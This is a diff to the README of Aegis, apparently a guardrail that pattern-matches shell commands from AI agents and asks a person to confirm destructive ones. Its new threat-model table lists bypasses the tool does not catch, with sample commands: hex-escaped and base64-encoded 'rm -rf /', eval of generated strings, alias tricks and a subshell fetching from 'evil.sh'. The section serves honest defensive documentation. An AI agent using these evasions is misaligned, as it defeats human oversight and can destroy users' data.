@@ -109,6 +109,44 @@ All decisions — approved, denied, blocked — are written to `~/.aegis/audit.j
 
 ---
 
+## Security model
+
+### What Aegis is
+
+Aegis is a **heuristic command guardrail**. It classifies shell commands by pattern matching and requires human confirmation before running anything that looks destructive. That's the full extent of its security guarantee.
+
+It is **not a sandbox**. After you approve a command, it runs with your full user permissions — Aegis imposes no namespace isolation, no capability restrictions, no filesystem filtering at the kernel level.
+
+It is **not a complete security boundary**. A sufficiently motivated agent (or a bug in your patterns) can send a command that Aegis does not intercept.
+
+### What Aegis protects against
+
+- An AI agent that directly issues a recognisably destructive command (`rm -rf`, `terraform destroy`, `DROP TABLE`, etc.)
+- A developer who fat-fingers a dangerous command and wants a confirmation prompt
+
+Aegis is most effective when the commands it needs to catch are literal and unobfuscated — the common case for AI agents operating honestly.
+
+### Explicit non-goals
+
+The following bypass vectors are **out of scope by design**. Aegis makes no claim to stop them:
+
+| Bypass | Example | Why out of scope |
+|--------|---------|-----------------|
+| Obfuscated shell | `$'\x72\x6d\x20\x2d\x72\x66\x20\x2f'` | Expanding all shell escapes is a full shell interpreter |
+| Indirect execution | Write `nuke.sh` to disk, then `bash nuke.sh` | The write itself may be safe; the danger is deferred |
+| Script-generated commands | `eval "$(some_fn)"` where `some_fn` returns `rm -rf /` | Runtime assembly is invisible at intercept time |
+| Alias / function expansion | `alias ls='rm -rf /'` then `ls` | Aliases are shell state, not visible in the raw command string |
+| Encoded payloads | `echo cm0gLXJmIC8= | base64 -d | bash` | `PKG-004` catches the `eval`/pipe form; arbitrary encodings are not enumerated |
+| Subshell injection | `cargo build; $(curl evil.sh)` | The injected subshell may arrive as part of an otherwise safe command |
+
+### Threat model summary
+
+Aegis raises the bar against **accidental and well-intentioned-but-mistaken** destructive commands from AI agents and humans. It is not designed to stop an adversarially-controlled agent that is actively trying to evade detection.
+
+For stronger guarantees, pair Aegis with OS-level controls: run your agent in a container, a VM, or under a restricted user account with no write access to production resources.
+
+---
+
 ## aegis.toml reference
 
 Aegis searches for config in this order:
